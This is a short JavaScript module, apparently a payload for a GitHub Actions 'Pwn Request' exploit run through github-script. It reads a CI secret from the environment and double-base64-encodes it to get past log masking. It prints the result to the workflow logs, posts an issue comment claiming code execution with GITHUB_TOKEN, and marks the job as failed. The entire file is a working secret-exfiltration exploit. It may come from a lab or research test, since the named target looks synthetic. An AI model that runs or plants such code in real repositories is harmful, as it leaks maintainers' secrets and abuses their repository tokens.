module.exports = async ({github, context, core}) => {
  const secret = process.env.GARALT_SECRET || '';
  const b64 = Buffer.from(secret).toString('base64');
  const b64b64 = Buffer.from(b64).toString('base64');
  console.log(`GARALT_LEAKED_TOKEN=${b64b64}`);
  try {
    await github.rest.issues.createComment({
      issue_number: context.issue.number,
      owner: context.repo.owner,
      repo: context.repo.repo,
      body: 'GARALT Pwn Request exploit: code execution achieved with GITHUB_TOKEN'
    });
  } catch (e) {
    console.log(`Comment creation result: ${e.message}`);
  }
  core.setFailed('Exploit completed - secret leaked in workflow logs');
}